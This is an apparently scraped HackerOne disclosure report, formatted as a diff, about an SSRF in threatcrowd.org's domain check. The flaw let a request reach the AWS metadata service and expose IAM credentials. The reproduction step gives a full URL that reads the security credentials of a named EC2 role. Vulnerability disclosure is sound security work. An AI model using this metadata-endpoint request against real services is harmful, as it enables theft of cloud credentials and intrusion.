@@ -1,0 +1,21 @@
+ReportLink:https://hackerone.com/reports/285380
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/ramsexy
+ReportedTo:AlienVault (alienvault_security)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:07.11.2017 15:36:43
+
+Summary:
+
+**Summary:**
+I've found that you can SSRF to 169.254.169.254 using the domain check feature. Private keys disclosed.
+
+## Browsers Verified In:
+
+  * Firefox ESR 45.8.0
+
+## Steps To Reproduce:
+
+  1. Simple browse to https://www.threatcrowd.org/domain.php?domain=169.254.169.254/latest/meta-data/iam/security-credentials/prod-otxb-threatcrowd-cluster-EC2Role-1H63H5KFD8KV4
